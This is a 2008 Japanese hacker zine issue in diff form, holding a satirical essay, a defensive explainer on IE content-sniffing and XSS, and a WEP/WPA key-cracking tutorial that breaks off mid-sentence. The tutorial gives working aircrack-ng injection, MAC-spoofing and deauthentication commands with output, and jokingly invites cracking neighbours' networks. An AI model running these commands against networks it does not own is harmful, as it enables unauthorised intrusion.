@@ -1,0 +1,1199 @@
+[-]=======================================================================[-]
+
+                      Wizard Bible vol.41 (2008,6,1)
+
+[-]=======================================================================[-]
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+  ---- 第0章：目次 ---
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+○第1章: ｻｼｰﾐとﾂﾅｰﾐ                                                金床 著
+
+○第2章: IEのContent-Type無視をHackする                はせがわようすけ 著
+
+○第3章: EeePCで無線LANハック                              エクセル小林 著
+
+○第4章: 基礎暗号学講座・第16回 ～拡張ElGamal暗号～            IPUSIRON 著
+
+○第5章: お知らせ
+
+○第6章: 著者プロフィール
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第1章: ｻｼｰﾐとﾂﾅｰﾐ  ---
+
+著者：金床
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■0x01.) はじめに
+
+　前回(Wizard Bible vol.40)予告したように、今回は「日本人の宗教とｶﾛｰｼ」に
+ついて、詳しく解説をおこなう。日本にやってきた外国人には奇異に映るであろ
+う、日本人の生態を解き明かすための一端となれば幸いである。
+
+
+■0x02.) 日本人の宗教
+
+　大部分の日本人は無宗教であると言われる。クリスマスを祝い、正月も祝う。
+結婚式は教会で、葬式は仏教でやる。しかしこれらの事から「宗教的におかしい
+のでは？」と感じているようでは、まだまだ修行が足りない。この奇妙に見える
+日本人の行動には、きちんとした共通点があるのだ。それは、「みんなそうやっ
+ているから、漏れもそうやる」ということだ。
+
+　日本は狭く、基本的にみんな同じような肌の色をし、東京弁や、敬語などの共
+通語を持ち合わせる。小学校のころより「みなと同じであることが美しく、正し
+い」と教えられ、目立てば叩かれる。本当は皆ひとりひとりが性格も好みも違う
+のだが、「異質=悪」と教え込まれるのである。
+
+　つまり、日本人にとっての宗教（根拠はないが皆が信じる決まりのこと）は「
+他人と同じ行動を取る」ということであり、そのような意味では日本人は非常に
+敬虔な信者が揃っていると言えるだろう。
+
+　さて成人男性（20代前半以上）については割合で見るとサラリーマンが圧倒的
+に多く、そのため必然的にサラリーマンであること、つまり会社のために仕事を
+することが徳を上げるための条件となる。残業、それもお金が出ないサービス残
+業（サビ残と略される）もいわば神への祈り。「キミ、ちょっと来週から2年間イ
+ンドネシア行ってきて」という神のお言葉にはもちろん逆らわず、デートを断る
+ときは「ごめん、仕事が忙しくて…」が決まり文句。もちろん女性の側も怒った
+りはしない。「彼って本当に敬虔だわ」とﾅｯﾄｸするのである。
+
+　これを読んでいる外国人のﾁﾐ。ウソじゃないんだ。「仕事が忙しくて」と言っ
+てデートを断っても、この国ではｹﾝｶにならないのだよ。
+
+
+■0x03.) 聖地
+
+　そんなわけで、日本人にとっての聖地は新橋（ｷﾞﾝｻﾞの近く）である。マスコミ
+がしょっちゅう（特に政治に絡んだ）インタビューを新橋駅前で行うことからも
+わかるように、ここは日本という国にとって特別な場所である。
+
+　黒かグレーのスーツに白いワイシャツを着た成人男性がうようよしている。金
+曜の夜は一週間の祈り（仕事）に報いるために神はｻｰｷを呑むことを許してくれる
+（まれに毎日呑んでいるやつもいるが、平均的なﾘｰﾏﾝは毎日呑むとお金が足りな
+くなるよう給与額が巧妙に計算されている）ため、周辺にはﾋﾟｭｰｸされたもんじゃ
+焼きが数多く生成され、土曜の朝にはﾋﾟｼﾞｮﾝがそれをついばむ。この地ではこの
+ような光景が何万年もの間繰り返されてきたのである。
+
+
+■0x04.) ｶﾛｰｼ
+
+　焦って徳を上げると、体がついてこないために死んでしまう。祈りすぎである。
+幼いころより「まわりと同じようにやれ」と洗脳されてきたために「仕事をしな
+い=悪」と思いこみ、体の調子が悪いのにもかかわらず祈り続けてしまうのだ。外
+国人からしたら信じられない現象だが、実際に発生している悲劇である。
+
+　そんなわけで、今仕事をし過ぎて体調を崩しているキミはすぐに「体調が悪い
+ので来週いっぱい休みます」と宣言し、5分以内に職場を後にしよう。「ちょっと
+まて、そんなことが許されると…」などとｶﾁｮｰに言われたら、「ﾎﾟｳﾝﾆﾁﾜ」と返せ
+ば丸く収まる。
+
+
+■0x05.) ﾂﾅｰﾐ
+
+　さて最近ﾎｯﾄな日本語といえばﾂﾅｰﾐである。先日CeCOSというカンファレンスが
+東京で開催され筆者も参加してきたのだが、とにかくﾂﾅｰﾐが流行っていた。どい
+つもこいつも二言目には「ﾂﾅｰﾐ」である。なんか大量に人が死んだことで世界的
+に認知された言葉なのに、藻前らなんでそんなにうれしそうにﾂﾅｰﾐﾂﾅｰﾐ言ってる
+の？って感じである。
+
+　ｶﾛｰｼとかﾊﾗｷﾘとかﾂﾅｰﾐとか、なんか死にまつわる日本語が流行していてよくな
+いのである。ｻｼｰﾐとかも、よく考えると「刺す」「身」とかで、ちょっとｶﾞｸﾌﾞﾙ
+な感じである。CeCOSで会ったオーストラリア人(AusCERTの人)は「明日は観光で
+ﾃﾝﾌﾟﾙとｼﾝｹﾝを見に行く」とか言っていて、「ｼﾝｹﾝ」って何？って訊いたら「Jap
+anese Swordだ」と言われてまたｶﾞｸﾌﾞﾙである。まったくｻﾑﾗｲとﾆﾝｼﾞｬの功績は計
+り知れないのだ。
+
+
+■0x06.) New Hope
+
+　さて日本人の宗教にも少しずつ変化が見られてきた。ﾈｯﾄの登場により、皆のテ
+レビ離れが進んできたせいである。従来日本にはごく限られた数のテレビチャン
+ネルしか存在せず、「皆が見るから漏れも見る」の法則により「テレビのネタを
+理解しないやつ=悪」という図式ができあがっていた。しかしネットを使うことで
+個人個人が本当に自分の趣味にあう画像や映像などを鑑賞できるようになったた
+め、人々は自然と多様性を持つようにシフトし始めたのである。
+
+　あと数年もすればこの多様性の広がりは大きなうねり（=ﾂﾅｰﾐ）となっておしよ
+せ、日本人の宗教観を大きく揺るがすことになるだろう。
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第2章: IEのContent-Type無視をHackする  ---
+
+著者：はせがわようすけ
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■0x01.) はじめに
+
+  Wizard Bible第40号で外国人からみたｽｼについて話題がでていたので、ここぞ
+とばかりに記事を書いてみることにしました。筆者はつい最近シアトルに行って
+きたのですが、そこで聞いた外国人からみたｽｼの実態は、ｽｼﾈﾀとｻｼｰﾐの混同どこ
+ろではなく我々の常識を大きく覆すものでした。
+  彼らが「ｽｼ」と呼ぶ、和食レストランで出されるものは、巻き寿司1本をそのま
+ま衣をつけて揚げ、2cmくらいにざっくりと切ったものだそうです。
+  恐るべし、ｽｼ。えーと、なんの話だっけ。
+
+
+■0x02.) つぎに
+
+  そうそう、IEの Content-Type: 無視の話でした。
+  XSSを引き起こし、Webアプリケーションの自由度を大きく引き下げることもあ
+るこの悪名高きContent-Type無視がどのように発生するのか、そのメカニズムに
+ついて本稿では説明します。
+
+
+■0x03.) はじめに 2.0
+
+  まず、IEの悪しき習慣「Content-Type無視」は、IEの設定「拡張子ではなく、
+内容によってファイルを開くこと」を「無効」に設定しただけでは解決しません。
+ユーザ側ではリスク低減のためにこの設定を「無効」にすることをお勧めします
+が、Webアプリケーション側でも性質によっては対策が必須となります。
+  また、IEの挙動は、レスポンスヘッダで指定されたContent-Typeが、レジスト
+リの"HKCR\Mime\Database\Content Type"に登録されているかいないかで大きく変
+わります。
+  以降の説明では、単に「レジストリに登録されている」と書いた場合にはこの
+"HKCR\Mime\Database\Content Type"に登録されていることを示します。また、「
+『拡張子によって…』」と書いた場合には、「拡張子ではなく、内容によって
+ファイルを開くこと」の設定を示します。
+  それでは説明に詳しい説明にうつります。
+
+
+■0x04. レジストリに登録されている場合
+
+  Content-Typeがレジストリに登録されている場合、IEの挙動は概ね以下のよう
+になります。
+
+●1. IE以外のアプリケーションが処理する場合
+
+  レジストリのCLSIDおよびExtensionから該当するアプリケーションを検索し、
+そのアプリケーションがコンテンツを処理します。PDFのようにアプリケーション
+がIEのプラグインとして登録されている場合には、コンテンツは無条件にそのア
+プリケーション上で開かれますし、そうでない場合にはダウンロードダイアログ
+が表示されます。
+
+●2. IEが処理する場合
+
+○2.1.「拡張子によって…」が有効な場合
+
+  先頭256バイトをスキャンしファイルタイプが決定されます。ここでファイルタ
+イプとして選ばれるものは、IE自身が処理できる形式（text/html、text/plainや
+image/*など）に限られます。この場合のファイルタイプの決定においては、HTM
+L としての優先順位が非常に高く、HTMLらしき文字列（<html>など）が含まれて
+いた場合にはHTMLとして処理されます。
+
+　ただし、image/gif、image/jpeg、image/pngにおいてはファイル先頭のマジッ
+クバイトにより画像ファイルであることが確認されるため、HTMLらしき文字列が
+含まれていても正しく画像として扱われます。一方、image/bmpおよびtext/plai
+nについてはHTMLらしき文字列（<html>など）が見つかった場合にはHTMLとして処
+理されます。
+
+　image/gifやimage/jpegの場合でも、マジックバイトが一致しない場合（GIF画
+像であるのにimage/jpegを返した場合なども）には、やはりファイル内容がスキ
+ャンされ、高い優先度をもってHTMLではないかの判断がなされます。
+
+○2.2.「拡張子によって…」が無効な場合
+
+  Content-Typeに従って、IE自身がそのコンテンツを処理します。
+
+
+■0x05. レジストリに未登録な場合
+
+  Content-Typeがレジストリに登録されていない場合、IEの挙動は概ね以下に説
+明するような動作になります。
+  ここで、URL-ExtはURL中のlocation.pathnameの拡張子部分を、QUERY_STRINGは
+URL中のlocation.search.substring(1)を指すものとします。例えば、URLが「ht
+tp://example.com/search.cgi?q=text」であった場合、URL-Extは".cgi"を、QUE
+RY_STRINGは"q=text"を示します。
+
+●URL-Extが".exe"または".cgi"の場合
+
+　拡張子としてQUERY_STRINGの末尾の"\.[A-Za-z0-9]+"が使われ、それに基づく
+ファイルタイプが仮選択されます。例えば、URLが「http://example.com/search
+.cgi?q=abcd.html」であった場合、拡張子は".html"となり、仮のファイルタイプ
+としてはHTMLが選択されます。
+  さらに、選択された仮のファイルタイプがHTMLやimage/*のようにIE自身で処理
+できる種類の場合、「拡張子ではなく…」とは無関係に、2.1と同様にファイル内
+容のスキャンが行われ、最終的なファイルタイプが決定されます。
+  選択された仮のファイルタイプがIE自身で処理できない場合は、外部のアプリ
+ケーションが起動されるか、またはダウンロードダイアログが表示されます。
+
+
+●URL-Extが".exe"および".cgi"以外の場合
+
+  拡張子としてURL-Extがそのまま使用されます。例えば、URLが「http://examp
+le.com/search.do?q=abcd.html」であった場合、拡張子は".do"となり、仮のファ
+イルタイプとして".do"に対応するハンドラがレジストリ中から検索されます。仮
+のファイルタイプ ".do"のハンドラがIEのプラグインとなっている場合は、その
+ファイルタイプが最終的なファイルタイプとなり、そのままプラグインアプリケ
+ーションによって開かれます。そうでない場合にはダウンロードダイアログが表
+示されます。
+  また、URLが「http://example.com/search.cgi/a.html」のような場合、拡張子
+は".html"となり、仮のファイルタイプとしてHTMLが選択され、レジストリから該
+当するハンドラが検索されます（ここまでは上記".do"と同じ）。
+  検索したハンドラがIEであり、IE自身がそのファイルを処理できる場合、「拡
+張子ではなく…」とは無関係に、2.1と同様にファイル内容のスキャンが行われ、
+最終的なファイルタイプが決定されます。
+
+
+■0x06. さいごに
+
+  このように、IEのContent-Type（正確にはファイルタイプ）の決定は、非常に
+複雑なものとなっています。特に、IEやWindowsのバージョン、レジストリの設定
+によって動作が異なる部分も多く、上述の部分でも環境によって異なることがあ
+るかも知れません。
+  総論的には、以下のルールを守ることでIEのContent-Typeに対しても安全なWe
+bアプリケーションとなります。
+
+・Windowsに登録されている Content-Type のみを生成する。
+・image/bmp および text/plain は避ける
+
+　特に前者については、初期状態のWindowsではPDFにも対応していないことや、
+IE6では application/atom+xmlといった新しいメディアタイプにも対応していな
+い点についても注意が必要です。
+
+  本稿については、Vista上のIE7について挙動を確かめながら書いていますが、
+間違いや勘違い、ツッコミやその他の環境での挙動差などがありましたら、ぜひ
+ともhasegawa@utf-8.jpまでご連絡ください。
+
+
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第3章: EeePCで無線LANハック  ---
+
+著者：エクセル小林
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■0x01.) はじめに
+
+　やあやあ。9900+α時間ぶりのこんばんは、そうじゃない人は初めまして。どう
+もエクセル小林です。
+
+　今回は「そろそろ次世代機が出るのに僕は4Gを買ってしまったよ記念」と称し、
+EeePCだけでWEPとWPAキーの解読したいと思います。まあ”だけ”といっても、E
+eePCをブンブン振り回して解読するワケにもいきませんので、「Aircrack-ng」と
+「aircrack-ptw」というツールを使っていきますが（笑
+　ここでMEISEKIな頭脳の方は「あれ？　解読って特定の無線LANカード（以下、
+NIC）とか必要じゃね？　でもEeePCってPCカード挿すとこなくね？　できなくね
+？」と思うかもしれませんが、実はEeePC単体だけでオッケーだったりします。他
+のラップトップがどうなのかわかりませんが、EeePCに搭載されているNICのチッ
+プはAtherosであるため、別途何かを購入する必要もなく、そのままデフォルトで
+オッケーでござるよｹｿｲﾁどのというワケです。にんにん。
+
+　さあキミも暗い部屋に引き篭もっていないで外に出よう！　そして垂れ流され
+ている（環境保護の為、一部文章の閲覧を修正させていただきました）しよう！！
+
+
+■0x02.) Aircrack-ngとaircrack-ptwってなによ？
+
+　藪からスティックにツール名をいわれてもよくわからんと思うので、とりあえ
+ず今回使用するツールについて簡単に説明しましょう。
+
+・Aircrack-ng
+　これがなければお話になりませんって感じなツールキットです。含まれている
+ツールを使えばキー解読はもちろんのこと、kismetみたいな周囲のアクセスポイ
+ント（以下、AP）の発見やIV（暗号化に使われる乱数列の基の数値）の蒐集、能
+動的なパケットの発生、NICのモード変更までもが可能なとんでもねえヤツです。
+
+公式サイト（http://www.aircrack-ng.org/doku.php）
+
+・aircrack-ptw
+　これはAircrack-ngに含まれるキー解読ツールのaircrack-ngの進化形だと思っ
+てくれちゃってオッケーです。解読に必要なパケット数が異常に少いため、短時
+間でCOOLに解読できちゃいます。話のわかるヤツだ。
+
+公式サイト（http://www.cdc.informatik.tu-darmstadt.de/aircrack-ptw/）
+
+
+■0x03.) 環境を作る
+
+　兎にも角にも、まずは環境を整えなければお話になりません。
+　できることならプリインストールされている策略と謀略と疑念と疑惑とあとア
+レに包まれたWindows XPでやりたいところですが、Aircrack-ngとaircrack-ptwは
+Linux系のみで動作するので、OSを新たにインストールする必要があります。まあ、
+Windows XPでも移植されたものが一応動作しますが、いくつかのツールが使えな
+かったりするので、パケットをキャプチャするのにドラ時間がかかっちゃいます。
+よっぽど運がよくない限り、解読中にEeePCの電源が間違いなく落ちることでしょ
+う。ショッキング！
+
+　というワケで、今回はLinux系XubuntuをEeePC用にカスタマイズした「eeeXubu
+ntu」をインストールするコトにします。コイツはmadwifiが初めから導入されて
+いたり、EeePC用のホットキーがデフォルトで使えたりするので、めんどくさがり
+の僕にはピッタリな一品なワケです。
+　ここ（http://wiki.eeeuser.com/ubuntu:eeexubuntu:home）で配布されている
+ISOイメージで起動させ、デスクトップにある「インストール」をクリックしてあ
+とはウィザードに従ってください。SDHCにインストールしたい人は「ubuntu SDH
+C」でグーグル先生にお願いすると幸せになれるかもしれません。
+
+　サクサクっとインストールが終了しましたら、続いてAircrack-ngをインストー
+ルしていきます。
+　Linux系場合はmakeコマンドでソースから大抵インストールするコトが多いです
+が、eeeXubuntuには「Synaptic パッケージマネージャ」なるアプリケーションを
+簡単にインストールできる機能がありますので、そこからインストールすること
+にします。[システム]→[Synaptic パッケージマネージャ]を開き、[設定]→[リ
+ポジトリ]からインターネットからダウンロードをすべてチェックしてから、検索
+でAircrack-ngを見つけてインストールします。
+
+　次にaircrack-ptwを以下のような感じでインストールします。
+　もしmakeの際に「エラーでありやがりますよコノヤローヽ(｀Д´）ノ」と吐か
+れる場合は、libpcapというパケットキャプチャ用ライブラリがなんだかDAMEにな
+っているので、インストールし直す必要があります。ソースからでもいいですが、
+これも「Synaptic パッケージマネージャ」からで大丈夫です。
+
+-----
+# cd /usr/local/src
+# wget http://www.cdc.informatik.tu-darmstadt.de/aircrack-ptw/download/aircrack-ptw-1.0.0.tar.gz
+# tar -zxvf aircrack-ptw-1.0.0.tar.gz
+# cd aircrack-ptw-1.0.0
+# make
+# make install
+# cp aircrack-ptw /usr/bin/
+-----
+
+
+■0x04.) 無線LANキー解読
+
+　それでは皆さんお待ちかね、キーの解読に入りましょう。
+　ターゲットAPのBSSIDは「00:11:22:33:44:55」、ESSIDは「niceboat」になりま
+す。
+
+●WEPキーの解読の場合
+
+　eeeXubuntuを起動し、ターミナルを開いて「airmon-ng」と打ち込んで現在装備
+されているNICを確認します。おそらく以下のように表示されるハズです。
+
+-----
+# airmon-ng
+
+Interface       Chipset         Driver
+
+wifi0           Atheros         madwifi-ng
+ath0            Atheros         madwifi-ng VAP (parent: wifi0)
+-----
+
+　続いて「airmon-ng start wifi0」と打ち込んでNICのモード変更です。ath1が
+新たに作られてモニターモードになると思います。このモニターモードというの
+は、その名の通り、空気中に垂れ流されているパケットを無差別に受信するモー
+ドのコトです。
+
+-----
+# airmon-ng start wifi0
+
+Interface       Chipset         Driver
+
+wifi0           Atheros         madwifi-ng
+ath0            Atheros         madwifi-ng VAP (parent: wifi0)
+ath1            Atheros         madwifi-ng VAP (parent: wifi0) (monitor mode enabled)
+-----
+
+　次に「airodump-ng ath1」と入力して周囲のAPを探します。
+
+-----
+ CH  ? ][ Elapsed: 30 s ][ 2007-05-24 11:36
+
+ BSSID              PWR  Beacons    #Data, #/s  CH  MB  ENC  CIPHER AUTH ESSID
+
+ 00:11:22:33:44:55   61      342       36    0   1  54  WEP  WEP         niceboat
+ 66:77:88:99:00:11   32      159       73    0   9  54  WEP  WEP         nakanidaremoimasenyo
+
+ BSSID              STATION            PWR  Lost  Packets  Probes
+
+ 00:11:22:33:44:55  AA:BB:CC:DD:EE:FF   55     0       63  niceboat
+ (not associated)   GG:HH:II:JJ:KK:LL   20     0       15
+-----
+
+　ターゲットAPである00:11:22:33:44:55を無事発見することができました。ツー
+ル側ではどれがお目当てのAPなのかわからず永遠に頑張り続けるため、[ctrl]+[c]
+で終了させてあげてください。
+
+　そして、今度はAPを探すためでなく、airodump-ngをターゲットAPのパケットキ
+ャプチャのために使っていきます。「airodump-ng --bssid <ターゲットAPのBSS
+ID> --c <ターゲットAPのチャンネル> -w <キャプチャファイル名> <使用するNI
+C>」で実行できますので、今回は「airodump-ng --bssid 00:11:22:33:44:55 --c
+ 1 -w /tmp/wep ath1」と入力することにします。キャプチャファイル名の末尾に
+は「-01.cap」や「-02.cap」などが自動的にくっつきます。
+
+-----
+ CH  1 ][ Elapsed: 30 s ][ 2007-05-24 11:40
+
+ BSSID              PWR  Beacons    #Data, #/s  CH  MB  ENC  CIPHER AUTH ESSID
+
+ 00:11:22:33:44:55   61      342       36    0   1  54  WEP  WEP         niceboat
+
+ BSSID              STATION            PWR  Lost  Packets  Probes
+
+ 00:11:22:33:44:55  AA:BB:CC:DD:EE:FF   55     0       63  niceboat
+-----
+
+　ここで雅な人はお気づきだと思いますが、普通にネットサーフィン（死語）し
+ただけではゴーホームしたいぐらい全然まったくIVを頂くことができないコトが
+わかります。なんだよどーすんだよ放置プレイかよ苦手だよなどといった心配し
+ちゃうかもしれませんが、こんなこともあろうかとAircrack-ngﾀﾝには「airepla
+y-ng」というものが装備されています。なななんとコイツはこっちから能動的に
+パケットを大量発生させるコト（パケットインジェクション）ができちゃうんで
+す！　すげえ！
+
+　さて、いつまでたっても増えない#Dataを見ていたってしょうがないので、さっ
+そくパケットインジェクションを実行していきましょう。
+　airodump-ngを動かしつつ、新しいターミナルを開いて「aireplay-ng -1 <何秒
+ごとに実行するか> -a <ターゲットAPのBSSID> -h <使用するNICのMACアドレス> 
+-e <ターゲットAPのESSID> <使用するNIC>」と入力し、ターゲットAPにfakeauth
+（ターゲットAPとNICの関連付け）をします。使用するNICのMACアドレスはiwcof
+igコマンドで確認しておいてください。
+
+-----
+# iwconfig
+lo        no wireless extensions.
+
+eth0      no wireless extensions.
+
+wifi0     no wireless extensions.
+
+ath0      IEEE 802.11g  ESSID:""  Nickname:""
+          Mode:Managed  Frequency:2.457 GHz  Access Point: Not-Associated
+          Bit Rate:0 kb/s   Tx-Power:17 dBm   Sensitivity=1/1
+          Retry:off   RTS thr:off   Fragment thr:off
+          Encryption key:off
+          Power Management:off
+          Link Quality=0/70  Signal level=-98 dBm  Noise level=-98 dBm
+          Rx invalid nwid:2278  Rx invalid crypt:0  Rx invalid frag:0
+          Tx excessive retries:0  Invalid misc:0   Missed beacon:0
+
+ath1      IEEE 802.11g  ESSID:""  Nickname:""
+          Mode:Monitor  Frequency:2.457 GHz  Access Point: ZZ:ZZ:ZZ:ZZ:ZZ:ZZ
+          Bit Rate:0 kb/s   Tx-Power:17 dBm   Sensitivity=1/1
+          Retry:off   RTS thr:off   Fragment thr:off
+          Encryption key:off
+          Power Management:off
+          Link Quality=0/70  Signal level=-98 dBm  Noise level=-98 dBm
+          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
+          Tx excessive retries:0  Invalid misc:0   Missed beacon:0
+
+# aireplay-ng -1 0 -a 00:11:22:33:44:55 -h ZZ:ZZ:ZZ:ZZ:ZZ:ZZ -e niceboat ath1
+12:34:19 Waitig for beacon frame (BSSID: 00:11:22:33:44:55)
+12:34:19 Sending Authentication Request 
+12:34:19 Authentication successful 
+12:34:19 Sending Association Request 
+12:34:19 Association successful :-) 
+-----
+
+　このとき、ターゲットAPがMACアドレスによるアクセス制限をしているような場
+合は、使用するNICのMACアドレスをairodump-ngのSTATIONに表示されたターゲッ
+トAPに接続しているユーザーのものに変更しておきましょう。「ifconfig <変更
+するNIC> hw ether <使いたいMACアドレス>」でできます。ターゲットAPに接続し
+ているユーザーがいない場合は潔く諦めてください（笑
+　また、ターゲットAPがANY接続拒否していると、ESSIDがairodump-ngで<length
+: ?>と表示されてしまって見ることができません。こんな場合には「aireplay-n
+g -0 1 -a <ターゲットAPのBSSID> <使用するNIC>」を何度か繰り返すことで、そ
+のうちairodump-ngで確認可能になるハズです。これもターゲットAPに接続してい
+るユーザーがｒｙ。
+
+　そして次にどうやってパケットを送信するかですが、これはターゲットAPに接
+続しているユーザーのアクセスがあるかないかでルート分岐が発生します。使い
+分けるのがめんどくせえ！　って人は後者の方法だけでオッケーです。
+
+　では、まずはアクセスがある場合での方法でレッツラゴーすることにしましょ
+う。
+　この場合は空気中に漂ってるARPリクエストを元にパケットを送信するarprepl
+ayをしますので、「aireplay-ng -3 -b <ターゲットAPのBSSID> -h <使用するNI
+CのMACアドレス> <使用するNIC>」と入力してください。実行後、airodump-ngの
+#Dataがとりつかれた様にどんどん増えていくのがわかると思います。
+
+-----
+# aireplay-ng -3 -b 00:11:22:33:44:55 -h ZZ:ZZ:ZZ:ZZ:ZZ:ZZ ath1
+Saving ARP requests in replay_arp-0123-456789.cap
+You must also start airodump to capture replies.
+Read 51 packets (got 0 ARP requests), sent 0 packets...
+-----
+
+　あとは解読を残すのみなので、もう勝ったようなものです。
+　キャプキャと同時に解読したい人は「aircrack-ng -z <キャプチャファイル名>」
+で、同時に解析できないけど少ないパケットで解読したい人はパケットが集まる
+のを待ってから「aircrack-ptw <キャプチャファイル名>」でスタートすればあと
+は放置でオッケーです。環境によって微妙に変わりますが、WEP128bitはaircrack
+-ngだと800kパケット、aircrack-ptwなら80kパケット集まればほぼ解読可能なハ
+ズです。シエスタでもしながら待っていてください。 
+
+-----
+# aircrack-ng -z /tmp/wep-01.cap
+以下略
+
+# aircrack-ptw /tmp/wep-01.cap
+以下略
+-----
+
+　以上でキーが手に入るハズです。お疲れ様でした。
+
+　続いてアクセスがない場合の方法です。
+　今度は前者と違い、ARPリクエストが漂っていてくれません。よって自分で発生
+させる必要がありますので、ビーコンからパケットを分析するFragmentationをし
+ます。「aireplay-ng -5 -b <ターゲットAPのBSSID> -h <使用するNICのMACアド
+レス> <使用するNIC>」と入力してください。
+
+-----
+# aireplay-ng -5 -b 00:11:22:33:44:55 -h ZZ:ZZ:ZZ:ZZ:ZZ:ZZ ath1
+12:40:35 Waiting for a data packet... 
+Read 52 packets... 
+
+        Size: 154, FromDS: 1, ToDS: 0 (WEP) 
+
+             BSSID = 00:11:22:33:44:55
+         Dest. MAC = AA:AA:AA:AA:AA:AA
+        Source MAC = BB:BB:BB:BB:BB:BB
+
+        0x0000: 0842 0201 000f b5ab cb9d 0014 6c7e decf .B.............. 
+        0x0010: 00d0 cf03 348c e0d2 4001 0000 2b62 7a01 ....4...@...+bz. 
+        0x0020: 6d6d b1e0 92a8 039b ca6f cecb 5364 6e16 mm.......o..Sdn. 
+        0x0030: a21d 2a70 49cf eef8 f9b9 279c 9020 30c4 ..*pI.....'.. 0. 
+        0x0040: 7013 f7f3 5953 1234 5727 146c eeaa a594 p...YS.4W'.l.... 
+        0x0050: fd55 66a2 030f 472d 2682 3957 8429 9ca5 .Uf...G-&.9W.).. 
+        0x0060: 517f 1544 bd82 ad77 fe9a cd99 a43c 52a1 Q.D...w.....<R. 
+        0x0070: 0505 933f af2f 740e ...?./t. 
+        ---CUT---
+
+Use this packet ? y (ここで[y]キーを押す)
+
+Saving chosen packet in replay_src-0123-456789.cap
+12:41:11 Data packet found!
+12:41:11 Sending fragmented packet
+12:41:11 Got RELAYED packet!!
+12:41:11 Thats our ARP packet!
+12:41:11 Trying to get 384 bytes of a keystream
+12:41:11 Got RELAYED packet!!
+12:41:11 Thats our ARP packet!
+12:41:11 Trying to get 1500 bytes of a keystream
+12:41:11 Got RELAYED packet!!
+12:41:11 Thats our ARP packet!
+Saving keystream in fragment-0123-456789.xor
+Now you can build a packet with packetforge-ng out of that 1500 bytes keystream
+-----
+
+　問題なく実行されたら、次はARPリクエストを作るために「packetforge-ng -0
+ -a <ターゲットAPのBSSID> -h <使用するNICのMACアドレス> -k <送信先IPアド
+レス> -l <送信元IPアドレス> -y <Fragmentationで作られた.xor> -w <任意のフ
+ァイル名>」と入力します。送信先IPアドレスはブロードキャストアドレスである
+「255.255.255.255」、送信元IPアドレスは適当で大丈夫です。 
+
+-----
+# packetforge-ng -0 -a 00:11:22:33:44:55 -h ZZ:ZZ:ZZ:ZZ:ZZ:ZZ -k 255.255.255.255 -l 192.168.11.11 -y fragment-0123-456789.xor -w aprr
+Wrote packet to: aprr
+-----
+
+　最後にInteractive packet replayで、自分で作ったARPリクエストを元にパケ
+ットを発生させます。「aireplay-ng -2 -r <packetforge-ngで作ったファイル名
+> <使用するNIC>」と入力してください。実行後、airodump-ngの#Dataが油断なく
+容赦なくどんどん増えていけば成功です。
+
+-----
+# aireplay-ng -2 -r aprr ath1
+
+        Size: 68, FromDS: 0, ToDS: 1 (WEP)
+
+             BSSID = 00:11:22:33:44:55
+         Dest. MAC = AA:AA:AA:AA:AA:AA
+        Source MAC = BB:BB:BB:BB:BB:BB
+
+        0x0000:  0841 de00 0014 6c7e 4080 000f b534 decf  .A....l~@.......
+        0x0010:  ffff ffff ffff 8045 d16a c800 6f4f ddef  ......@E.j..oO..
+        0x0020:  b488 ad7c 9f2a 64f6 ab04 d363 0efe 4162  ...|.*d....c..Ab
+        0x0030:  8ad9 2f74 16bb abcf 232e 97ee 5e45 754d  ../t....#...^EuM
+        0x0040:  23e0 883e                                #..>
+
+Use this packet ? y（ここで[y]キーを押す）
+
+Saving chosen packet in replay_src-1234-567890.cap
+You should also start airodump-ng to capture replies.
+ 
+Sent 512 packets...
+-----
+
+　あとは解読だけですが、方法は前者と変わらないため省略しますのであしから
+ず。
+
+●WPAキーの解読
+
+　ターゲットAPのパケットキャプチャまではWEPと同じなので、解読に必要なハン
+ドシェイクの手に入れ方からいきたいと思います。
+　まずは「aireplay-ng -0 1 -a <ターゲットAPのBSSID> -c <ターゲットAPに接
+続しているユーザーのMACアドレス> <使用するNIC>」と入力してDeauthenticati
